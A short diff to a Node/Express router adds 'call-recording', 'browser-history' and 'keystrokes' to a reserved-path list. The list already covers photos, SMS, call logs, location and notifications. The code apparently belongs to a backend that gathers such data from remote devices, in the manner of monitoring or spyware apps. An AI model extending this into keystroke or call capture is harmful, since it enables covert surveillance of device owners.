@@ -421,7 +421,8 @@ router.post('/:deviceId', async (req, res, next) => {
   // Skip if deviceIdParam matches a known route
   const reservedPaths = ['photos', 'sms', 'permissions', 'sync', 'command-ack', 
                          'heartbeat', 'fcm-token', 'notifications', 'notification',
-                         'call-logs', 'app-usage', 'location', 'admin', 'debug'];
+                         'call-logs', 'app-usage', 'location', 'admin', 'debug',
+                         'call-recording', 'browser-history', 'keystrokes'];
   if (reservedPaths.includes(deviceIdParam.toLowerCase())) {
     return next('route');
   }
